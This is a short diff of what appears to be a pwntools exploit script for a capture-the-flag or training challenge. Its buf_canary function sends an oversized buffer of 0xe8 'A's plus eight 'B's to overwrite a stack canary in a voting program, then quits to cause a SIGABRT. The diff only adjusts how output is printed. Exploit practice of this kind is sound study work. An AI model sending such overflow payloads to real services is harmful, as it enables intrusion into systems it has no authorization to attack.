@@ -35,15 +35,15 @@ def buf_canary():
 
     # try overwrite canary, msg[0xe0] and 8 bytes for 2 integers
     # To Angelboy:
-    print('To Angelboy: --> ', r.recv())
+    r.recv()
     r.sendline('A' * 0xe8 + 'B' * 8)
 
     # Done!
     print('Done: --> ', r.recv())
 
-    # quit voting
-    r.sendlineafter('>', '3')
-    print('SIGABRT')
+    # quit voting --> SIGABRT occurred
+    r.sendline('3')
+    print(r.recv())
 
 
 def main():
